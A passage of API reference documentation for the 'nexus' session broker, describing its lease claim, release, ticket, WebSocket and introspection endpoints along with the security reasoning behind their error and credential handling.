> the real socket dropped. A `nexus` build predating the protocol now fails to
> register on **every** broker, and removing the `auth:` block is no longer a
> workaround. Upgrade the binary the [registry entry](#binary-registry-binaries)
> points at; the check is per **spawn**, so one stale variant fails while every
> other entry keeps working.

Every refusal — unknown lease, absent secret, wrong secret, skewed frame version
— is closed with the same `policy violation` / `unknown lease` close, so a dialer
cannot difference the responses to enumerate live lease ids. **The log is the only
place the causes are distinguished**, and each `WARN` names its own fix: upgrade
the binary (skewed version), upgrade the binary (absent secret), or investigate an
impostor (wrong secret). None of them ever contains a secret value. The
diagnostics matter because the symptom is identical and misleading — every claim
returns `504 instance did not become ready in time` while the child process is
alive and connecting fine, which reads as a network fault.

The secret is never logged, never returned by `GET /leases`, and never passed in
argv.

### `POST /claim` (HTTP API, not YAML)

`POST /claim` mints a lease, spawns an instance with the supplied config, waits
for it to dial back and signal ready, and returns the lease coordinates. The
request is a small JSON envelope; `session_id` is optional.

```jsonc
// request body
{
  "config": "engine:\n  name: example\n",  // required: full nexus config (YAML text)
  "session_id": "prior-session-id",         // optional: resume a persisted session
  "binary": "vision"                        // optional: which `binaries:` entry to spawn
}
```

`binary` names an entry of the broker's [binary registry](#binary-registry-binaries).
**Omitted means the reserved `nexus` entry**, which every load guarantees exists —
so the field is additive and a client written before the registry existed keeps
getting exactly what it got before. Leading/trailing whitespace is trimmed, the
same way entry names are trimmed at load, so the two always agree. There is no
operator-settable default: an operator must not be able to silently change what
an existing client ends up spawning. (On a **resume**, omitted instead means the
entry that created the session — see
[Resume inherits the recorded binary](#resume-inherits-the-recorded-binary).)

An **unknown** name is **HTTP 400**, with a message echoing the rejected name and
listing the registry's actual entries — not a silent fallback to `nexus`, which
would produce a session that merely behaves oddly. The name is resolved **before
anything is allocated**, so a rejected claim consumes no lease, no capacity slot
(it never even joins the FIFO wait queue), no temp config file, and spawns no
process.

The selected entry's `args` are appended after the broker's own `-config` /
`-recall` arguments, and its `env` is layered under the broker-owned
`NEXUS_BROKER_*` variables — see [Binary registry](#binary-registry-binaries).
The spawned instance does **not** inherit the broker's environment wholesale: it
carries the always-pass set, whatever [`inherit_env`](#instance-environment-inherit_env)
declares, the entry's `env`, and the `NEXUS_BROKER_*` trio, and nothing else.

When `session_id` is set the broker spawns the instance with `-recall <id>` so
the engine reloads that session and replays its history; when omitted it starts
a fresh session. An unknown/invalid `session_id` makes the engine fail to boot,
so the instance never signals ready and the claim returns `502` ("instance
exited before signalling ready") rather than silently starting a new session.

#### Resume inherits the recorded binary

On a resume, `binary` is reconciled against the entry recorded for that session
in the [session → binary index](#session--binary-index-session-binariesjsonl).
A session directory is engine state written by one particular build, and
replaying it under a different variant does **not** fail loudly — the engine
boots, the transcript loads, and the session simply behaves as though
capabilities it once had have vanished. The claim is the only point at which that
mistake is still attributable, so:

| `session_id` | `binary` | Recorded binding | Outcome |
|---|---|---|---|
| set | omitted | `vision` | **Spawns `vision`** — the recorded entry is inherited, *not* the reserved `nexus`. |
| set | `vision` | `vision` | Proceeds normally. |
| set | `nexus` | `vision` | **`409`** — `{"error":"session \"…\" was created by binary \"vision\" but this claim requests \"nexus\"; …"}`. The message names **both** the recorded and the requested entry. |
| set | anything | *(none)* | **Falls through**: spawns the requested entry, or `nexus` when none was requested. **No error.** |
| set | omitted | `nocturne`, no longer in `binaries:` | **`409`** — the message names the missing entry so it can be restored. Deliberately *not* a silent fallback to `nexus`, which is the same foreign-build replay the mismatch row prevents. |
| omitted | anything | — | Not a resume; resolves as described above. |

An **unknown** requested name is still `400` (not `409`) even on a bound session:
a misspelling is a client bug, and only the `400` lists the entries that exist.

The check runs **before anything is allocated**, on the same path as the unknown-name
`400`, so a refused resume consumes no lease, no capacity slot, no temp config
file, and spawns no process.

`409` rather than `400` or `500` for both conflict rows: the request is
well-formed and the caller named a real session, so a `400` would blame it for a
value it never sent; and nothing failed, so a `500` would report a healthy broker
as broken. What conflicts is the session's recorded state against this broker's
current configuration.

The binding is **best-effort by construction** and this check inherits that: an
unknown binding is *no opinion, proceed*. A broker with no `state_dir`, a session
created before bindings were recorded, and a binding evicted by the index's
4096-entry cap all resume exactly as they did before the check existed — none of
them is ever reported as a mismatch.

```jsonc
// success response (200)
{
  "lease_id": "…",                          // lease handle for this instance
  "ws_url": "ws://host:port/lease/<lease>",  // client WebSocket endpoint
  "session_id": "…",                         // engine session id: the generated id for a
                                             // new session (capture it to -recall later),
                                             // or the requested id echoed back on resume
  "ticket": "…"                              // single-use, 30s credential for ws_url;
                                             // ABSENT when auth is disabled
}
```

When authentication is enabled, connect to `ws_url` with **either** the returned
`ticket` (`ws_url + "?ticket=" + ticket`) or the **same** bearer credential the
claim was made with: the client socket enforces lease ownership, so another
principal's token — or none at all — is refused before the upgrade. See
[`WS /lease/{lease_id}`](#ws-leaselease_id-http-api-not-yaml) and
[Lease ownership](#lease-ownership).

`ticket` is a **single-use, 30-second** credential bound to this lease **and** the
claiming principal, for clients that cannot present a bearer header on the
WebSocket handshake — which is every browser, since browser JavaScript cannot set
headers on a WebSocket upgrade. It is **omitted** (not empty) when the broker runs
with no `auth:` block, because there is then nothing to authenticate and
`WS /lease/{lease_id}` accepts a connection with no ticket at all. It is also
omitted in the unlikely event minting failed; `POST /ticket/{lease_id}` mints a
replacement. Adding the field is **additive** — a client that ignores unknown JSON
keys is unaffected. See [`POST /ticket/{lease_id}`](#post-ticketlease_id-http-api-not-yaml)
for the TTL rationale and the refresh path.

#### `ws_url` resolution

The returned `ws_url` must name the broker that **holds the lease** — a lease is
in-memory state on one process, so a reconnect routed elsewhere is worthless. The
host is resolved in strict precedence order:

| Precedence | Source | Notes |
|------------|--------|-------|
| 1 | `advertise_addr` | Explicit operator intent about how this broker is reached. Nothing overrides it. |
| 2 | An explicit, non-wildcard host in `listen_addr` | e.g. `10.0.0.7:8080` — already unambiguous. |
| 3 | The claim request's `Host` header | A **guess**. Correct for a directly-connected client; **wrong** behind a proxy or load balancer, where it names the intermediary. |
| 4 | `127.0.0.1:<listen port>` | Last resort when there is no request `Host` at all. |

The scheme is `ws://` unless a scheme-qualified `advertise_addr` says otherwise —
so a deployment that terminates TLS at a proxy sets
`advertise_addr: "wss://broker-1.example.com"` while the broker itself keeps
speaking plain HTTP on its bind address.

When `advertise_addr` is unset **and** `listen_addr` names no host, the broker
logs one `WARN` at startup naming the consequence: `ws_url`s will be derived from
each request's `Host` header. The broker still starts — this shape is correct for
a directly-reachable broker.

A `wss://` or `https://` `advertise_addr` likewise logs one `WARN` at startup: the
broker has no TLS listener, so it is advertising a scheme it does not serve. The
broker still starts, because that is exactly right behind a TLS-terminating proxy
and the process cannot tell whether one is there. Advertise `ws://` (or a bare
`host:port`) on a broker nothing fronts.

This resolution is **client-facing only**. The `/instance` dial-back address
handed to a spawned instance is resolved separately and always collapses a
wildcard bind to `127.0.0.1`, because instances are same-host by design;
`advertise_addr` does not affect it.

### `POST /release/{lease_id}` (HTTP API, not YAML)

`POST /release/{lease_id}` tears a live instance down gracefully. The broker
sends a `shutdown` frame to the instance, whose `nexus.io.broker` plugin emits
`io.session.end` so the engine performs a clean `Stop` — flushing and
persisting the session before exit. The broker then waits up to `release_grace`
for the process to exit and **force-kills it** if that window elapses (no
orphan). The lease is removed and its slot freed. The session directory under
`~/.nexus/sessions/<id>/` is left intact and remains resumable via `-recall`.

| Outcome                                  | Status | Body                                      |
|------------------------------------------|--------|-------------------------------------------|
| Released (graceful or killed)            | `200`  | `{"status":"released","lease_id":"…"}`    |
| Unknown / already-released lease         | `404`  | `{"error":"unknown lease"}`               |
| Lease owned by a **different** principal | `404`  | `{"error":"unknown lease"}` — deliberately identical to the row above; see [Lease ownership](#lease-ownership) |
| Missing lease id in path                 | `400`  | `{"error":"release requires a lease id"}` |

Release is idempotent: releasing an already-gone lease returns `404` rather than
erroring, and concurrent releases of the same lease collapse to a single
teardown.

### `POST /ticket/{lease_id}` (HTTP API, not YAML)

`POST /ticket/{lease_id}` mints a **fresh** client-WebSocket ticket for a caller
that owns the lease. It takes no request body.

Tickets exist because browser JavaScript **cannot** set headers on a WebSocket
handshake, so the bearer credential a claim was made with can never reach
`WS /lease/{lease_id}` from a browser. A ticket is the one credential the broker
itself mints, and it is deliberately not a general-purpose token:

| Property        | Value                                                                 |
|-----------------|-----------------------------------------------------------------------|
| Lifetime        | **30 seconds**, fixed. **Not configurable** — see below.               |
| Uses            | **One.** Redemption atomically consumes it; two concurrent redemptions cannot both succeed. |
| Scope           | Bound to **one lease** *and* **one principal `ID`**. A ticket for lease A is refused for lease B. |
| Storage         | In-memory only. Tickets do **not** survive a broker restart; mint a new one. |
| Invalidation    | **Every** ticket for a lease is destroyed the moment the lease goes away — manual `POST /release`, `idle_timeout` reaping, **and** crash detection alike, because invalidation hooks the single point all three teardowns converge on. |

**Why the TTL is not a config key.** A ticket travels as a URL query parameter, so
it lands in reverse-proxy access logs, browser history and referrer chains no
matter what the broker does. The tight window plus single use *are* the mitigation
for that exposure, so making it adjustable would let a deployment silently remove
the only thing that makes the design safe. The broker never logs a ticket **value**
— issuance records carry `lease_id` and `principal_id` and a boolean, nothing more.

**Why a refresh route exists.** 30 seconds covers a claim → connect round trip, not
a reconnect after a dropped socket or a laptop resume. The alternative to refreshing
would be re-claiming, which spawns a *new* instance and abandons the live session.

```jsonc
// success response (200)
{
  "lease_id": "…",
  "ticket": "…"     // ABSENT when auth is disabled (see below)
}
```

| Outcome                                  | Status | Body                                     |
|------------------------------------------|--------|------------------------------------------|
| Ticket issued                            | `200`  | `{"lease_id":"…","ticket":"…"}`          |
| Unknown / already-released lease         | `404`  | `{"error":"unknown lease"}`              |
| Lease owned by a **different** principal | `404`  | `{"error":"unknown lease"}` — byte-identical to the row above, so the route is not a lease-id oracle; see [Lease ownership](#lease-ownership) |
| Missing lease id in path                 | `400`  | `{"error":"ticket requires a lease id"}`  |

**With the `auth:` block absent, ticket issuance is inert.** The route still answers
`200` for a lease the (anonymous) caller owns, but the `ticket` key is **omitted**
— there is no identity to bind a capability to, and `WS /lease/{lease_id}` keeps
accepting a connection with no ticket exactly as it did before tickets existed.
Clients must therefore treat a missing `ticket` as "this broker issues none",
never as an empty-string ticket.

### `WS /lease/{lease_id}` (HTTP API, not YAML)

The per-lease client socket. Connect to the `ws_url` returned by
[`POST /claim`](#post-claim-http-api-not-yaml) and exchange broker frames with the
instance. It accepts **two** credentials:

| Credential | How it is presented | For |
|------------|---------------------|-----|
| Ticket  | `?ticket=<value>` on the handshake URL — `ws_url + "?ticket=" + ticket` | Browsers, which **cannot** set headers on a WebSocket upgrade. Issued by `POST /claim` and [`POST /ticket/{lease_id}`](#post-ticketlease_id-http-api-not-yaml). |
| Bearer  | `Authorization: Bearer <token>` | Go/CLI and any other client that can set request headers. Use the same token the lease was claimed with. |

**Precedence: a non-empty `?ticket=` wins, and wins exclusively.** When both are
presented the `Authorization` header is **not consulted at all**, and a ticket
failure is final rather than falling back to the header. Falling back would soften
single use into "single use unless you also hold a token" — a replayed ticket
accompanied by a valid header would connect — so a client that sends both and lets
its ticket expire is refused despite the good header. Send one credential, or mint a
fresh ticket.

| Outcome                                                              | Handshake | Body                                    |
|----------------------------------------------------------------------|-----------|-----------------------------------------|
| Credential accepted and the caller owns the lease                    | `101`     | *(socket upgraded)*                     |
| No credential at all (auth enabled)                                  | `401`     | `{"error":"authentication required"}`    |
| Bearer token rejected by the validator chain                         | `401`     | `{"error":"credential rejected"}`        |
| Ticket **unknown**, **expired**, **already redeemed**, or minted for a **different lease** | `401` | `{"error":"credential rejected"}` — all four are **byte-identical**, so a holder of one value learns nothing about any other |
| Unknown, already-released, **or** another principal's lease          | `404`     | `unknown lease` (plain text; the route cannot answer JSON before an upgrade) |

**A refusal always precedes the upgrade** — the handshake never reaches `101` and
is then closed. An accept-then-close is observably different from a clean refusal
(it confirms the lease id reached a live handler), which would defeat the point of
answering an unowned lease identically to an unknown one.

**The ticket burns on connect.** Redemption atomically consumes it, so a second
connect with the same value is refused; mint a replacement with
`POST /ticket/{lease_id}`. A ticket presented for the **wrong** lease is refused
*without* being consumed — a failed authorization check is not a use, so a stale
reconnect cannot destroy a credential the legitimate holder still needs — but the
response is identical either way.

Ticket **values are never logged**. The connect record carries `lease_id`,
`principal_id` and which channel was used (`ticket`, `bearer` or `anonymous`),
never the credential itself.

`OriginPatterns` is `*`: the broker does **not** use the `Origin` header as access
control. The credential is the access control.

**With the `auth:` block absent, neither credential is consulted** — not the
header, not the ticket — and the route is exactly "does this lease exist?", as it
was before authentication existed. A client built for an authenticated broker can
point a `?ticket=` at an open one and it still connects, rather than being refused
by a store that never issued anything.

After the upgrade, inbound `io` frames (client → instance) reset the
`idle_timeout` timer — as does the instance reporting its turn finished, and a
turn in flight suspends the timer entirely (see
[`idle_timeout`](#session-broker-nexus-broker)) — and a frame whose `lease_id`
does not match the socket's lease is dropped.

#### `?from_seq=<n>` — resuming a dropped stream

A **second** query parameter, orthogonal to the credential: `?from_seq=<n>` states
the highest [`seq`](#session-broker-nexus-broker) the client received before its
socket dropped. The broker replays every frame it still retains **after** `n`,
oldest first, and only then continues with the live stream — replayed frames
always precede live ones. It is a query parameter for the same reason `?ticket=`
is (a browser cannot set headers on a WebSocket upgrade, and there is no
client → broker control frame to carry it in), and the two **compose in any
order**.

`?from_seq=` is **not a credential.** Ticket precedence, ownership and every
refusal above are unchanged by its presence: it can never widen what a caller may
connect to, only what an already-admitted caller is handed first.

| Value | Behaviour |
|-------|-----------|
| Absent | The live stream only — byte for byte what every connect did before resumption existed. |
| `0` | Replay **everything** the buffer still holds. Not the same as absent: it is a client saying it has seen nothing. |
| `n` > 0 | Replay the retained frames with `seq > n`. |
| `n` greater than the lease's last `seq` | Reported as a `restarted` gap (see below) and the whole retained buffer is replayed — the client's numbering came from a stream that no longer exists. |
| Malformed (not a number, negative, out of range) | Treated as **absent**, never refused. A resume is an optimisation on top of a connection that works without it, so a client bug in building the URL costs the replay, not the session. |

The replay is **not** bounded by the connection's 256-frame send queue — it is
written ahead of it — so the full [`client_replay_buffer_bytes`](#session-broker-nexus-broker)
worth of frames replays intact however many frames that is.

**When the buffer cannot cover the resume point**, the socket opens with a
`stream-gap` frame *before* anything else, naming the range that is gone:

```json
{"version":1,"lease_id":"…","signal":"stream-gap",
 "payload":{"reason":"evicted","requested_from_seq":41,"missing_from_seq":42,"missing_through_seq":118}}
```

| Field | Meaning |
|-------|---------|
| `reason` | `evicted` — the frames aged out of the bounded buffer. `restarted` — `requested_from_seq` is ahead of this lease's stream, which is what a lease restored across a broker restart looks like (the buffer is in-memory, so a restored lease renumbers from 1). |
| `requested_from_seq` | Echoes the `from_seq` presented, so a client with several sockets in flight can tell which request it answers. |
| `missing_from_seq`, `missing_through_seq` | **Inclusive** bounds of the frames the broker can no longer supply. Both are **omitted** when nothing is nameable — a `restarted` stream has no missing range under the new numbering. |

The gap frame carries **no `seq`**: it describes one connection, not the lease's
frame stream, so numbering it would make the stream's sequence depend on how often
a client dropped. A gap is a **normal outcome a client must handle**, not an
error — it is what any disconnection longer than the buffer produces. Adding the
`stream-gap` signal needed no `brokerframe` version bump for the same reason `seq`
did not: it is only ever sent to a client that opted in by presenting `?from_seq=`.

The reconnect recipe end to end — mint a fresh ticket, send `from_seq`, handle the
gap — is in the
[session broker guide](../guides/session-broker.md#reconnecting-and-resuming-a-stream).

### `GET /leases` (HTTP API, not YAML)

`GET /leases` is a read-only introspection surface: it reports a snapshot of live
leases, sorted by `created_at` then `lease_id`, plus — for an operator — the
capacity and queue aggregates. It performs no mutation.

**What a caller sees depends on who it is.** There are two response shapes:

| Caller                                                          | Leases                          | Aggregates |
|-----------------------------------------------------------------|---------------------------------|------------|
| Holds `auth.admin_scope` (an **operator**), or auth is disabled  | every live lease                | included   |
| Any other authenticated caller                                   | only leases it owns             | **omitted**|

**Operator response** — the full shape, unchanged from before scoping existed:

```jsonc
// response (200) — operator, or auth disabled
{
  "max_concurrent": 8,     // configured cap (0 = unlimited)
  "slots_in_use": 2,       // live instances currently holding a slot
  "queue_depth": 0,        // claims parked in the FIFO capacity wait queue
  "leases": [
    {
      "lease_id": "…",
      "session_id": "…",                       // omitted until reported by the instance
      "pid": 41234,
      "state": "active",                        // "spawning" | "active" | "draining"
      "reason": "manual release",               // teardown reason once draining; omitted otherwise
      "last_activity": "2026-06-25T12:00:00Z",  // RFC3339
      "created_at": "2026-06-25T11:59:30Z"      // RFC3339
    }
  ]
}
```

**Caller-scoped response** — same lease objects, same ordering, but only the
caller's own leases and **no aggregate keys at all**:

```jsonc
// response (200) — authenticated non-operator
{
  "leases": [
    {
      "lease_id": "…",
      "session_id": "…",
      "pid": 41234,
      "state": "active",
      "last_activity": "2026-06-25T12:00:00Z",
      "created_at": "2026-06-25T11:59:30Z"
    }
  ]
}
```

The aggregates are **absent, not zeroed**: `max_concurrent`, `slots_in_use` and
`queue_depth` let one tenant infer another's load, and a zero would read as a
factual claim about an idle broker to a client that does not know it is
unprivileged. Clients must therefore treat a missing key as "not disclosed"
rather than as `0`.

A caller that owns no live lease gets `200` with `{"leases": []}` — never a `404`
and never an error. Filtering happens inside the registry snapshot, under the same
lock that guards the lease table, so a lease the caller may not see is never
copied out at all.

Surface states: `spawning` (lease exists, instance not yet registered),
`active` (registered, frames can flow), `draining` (a teardown has latched).

### `GET /binaries` (HTTP API, not YAML)

`GET /binaries` lists the entries of the [binary registry](#binary-registry-binaries)
this broker can spawn, so a client can render a picker from live broker truth
instead of hardcoding names that may not exist on the broker it is talking to.
It performs no mutation and reads nothing from the request.

```jsonc
// response (200) — entries sorted by name
{
  "binaries": [
    { "name": "archive", "label": "Nexus 0.9" },
    { "name": "nexus" },
    {
      "name": "vision",
      "label": "Nexus (vision)",
      "description": "Multimodal build with the image tools compiled in"
    }
  ]
}
```

| Field                     | Type             | Description |
|---------------------------|------------------|-------------|
| `binaries`                | list of object   | The listing. Always present and never `null` — an empty registry would encode as `[]` — so a client can iterate it unconditionally. |
| `binaries[].name`         | string           | The registry key — the exact string to put in a claim's `binary` field. Always present. |
| `binaries[].label`        | string           | The entry's `label`. **Omitted** when the operator set none. |
| `binaries[].description`  | string           | The entry's `description`. **Omitted** when the operator set none. |

**The response is an object, not a bare array.** The envelope exists so a
broker-wide fact — a default-binary hint, a schema version — can be added later as
a sibling key, which a client that ignores unknown keys will not notice. A
top-level array has nowhere to put one, so adding it would mean changing the
top-level JSON type and breaking every client at once.

**`path`, `args` and `env` are never serialized**, nor is the derived absolute
path the broker resolved at boot. They are broker-host detail — build locations,
deployment flags, per-variant environment — that a claiming client has no use for
and every reason not to learn. Only the three fields above cross the wire.

`label` and `description` are **absent, not empty**, when unset, so a client can
tell "the operator wrote nothing" from "the operator wrote an empty string". A
consumer with no label falls back to `name`, which is always present.

Ordering is by `name`, ascending — stable across requests and identical for every
caller, so a picker does not reshuffle. The *contents* are not stable across a
restart: the registry is read once at startup, so an operator's edit changes the
listing the next time the broker boots. The reserved `nexus` entry is always
included: it is spawnable from every broker no matter what the config says.

The listing is **unfiltered** — every caller sees every entry. There is no
per-principal visibility rule: an entry name is not a secret (an unknown one is
already rejected by `POST /claim` with a **400** naming the alternatives), and a
filter would need a per-entry authorization model no config key describes.

Authentication follows `POST /claim` exactly: the route is registered behind the
same middleware, so with an `auth:` block a missing or invalid credential is
refused (**401**) and a valid one gets the list; with no `auth:` block the route
serves an unauthenticated caller, which is a supported deployment rather than a
degraded one.

Full narrative, the new-vs-resume flow, a WebSocket connect sketch, and the v1
deployment caveats live in the
[Session Broker guide](../guides/session-broker.md).

---

## Cross-references

- [Plugin System](../../../.claude/docs/plugin-system.md) — plugin lifecycle,
  `Requires()` vs `Dependencies()`, capability resolution.
- [Gates](../../../.claude/docs/gates.md) — vetoable event mechanics shared by
  every gate plugin.
- [Tool System](../../../.claude/docs/tool-system.md) — tool choice, parallel
  dispatch, structured output.
- [RAG](../../../.claude/docs/rag.md) — embeddings, vector store, ingestion.
- [I/O Transport](../../../.claude/docs/io-transport.md) — browser vs Wails,
  parity rule.
- [Desktop Shell](../../../.claude/docs/desktop-shell.md) — embedder API.
